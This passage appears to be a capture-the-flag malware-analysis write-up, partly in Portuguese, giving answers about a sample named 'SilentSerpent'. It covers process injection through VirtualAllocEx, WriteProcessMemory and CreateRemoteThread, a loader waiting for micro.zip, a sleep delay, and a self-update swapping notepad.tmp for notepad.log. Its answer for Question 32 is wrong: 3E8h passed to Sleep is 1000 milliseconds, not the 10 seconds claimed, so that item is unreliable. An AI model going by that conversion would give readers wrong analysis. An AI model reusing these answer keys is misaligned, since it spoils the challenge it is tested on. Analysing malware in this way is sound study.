To run malicious code inside a process, the malware follows this flow: It defines the target process, allocates memory in the target process (VirtualAllocEx), writes the payload to that allocated memory (WriteProcessMemory), and finally creates a thread in the target process to execute the injected code (CreateRemoteThread).

![alt text](SilentSerpent/Oab6aXA.png)

R: CreateRemoteThread

---

## 4.1.31 Question 31
```
The second downloaded payload is used as a transient utility. What is the file this transient payload is responsible for dropping?
```

Afterwards, the main loader waits for the appearance of `micro.zip` on the disk. When the file is detected, the flow moves on to the next step.

![alt text](SilentSerpent/VrnJYRg.png)

R: micro.zip

---

## 4.1.32 Question 32
```
After the second payload execution and before starting the final download, the malware introduces a short delay. How long (in seconds) is this sleep/delay before the third payload download?
```

In the previous question we can see 3E8h being passed to the `Sleep` function, which in decimal -> 10s.

R: 10

---

## 4.1.33 Question 33
```
In the self-update mechanism, what is the filename that contains the *new* version of the main payload?
```

![alt text](SilentSerpent/6kDy0xa.png)

R: notepad.tmp

---

## 4.1.34 Question 34
```
Which Windows API is used to replace the old main payload with the content of the update file?
```

A API e `CopyFileA`. Ela copia o conteudo do arquivo de atualizacao (notepad.tmp) para substituir o payload principal (notepad.log), usando `FALSE` no terceiro parametro para permitir a sobrescrita do arquivo existente.

![alt text](SilentSerpent/5dJLyge.png)

R: CopyFileA

---

## 4.1.35 Question 35
```
If the main payload is found on the disk, what is the fileless execution flag that is passed to the loader to ensure the malware remains resident in memory?
```

R:0

# Harvest Moon

> **Scenario:** Multiple modules target sensitive data across the system. Dissect each component and catalog the collection capabilities.

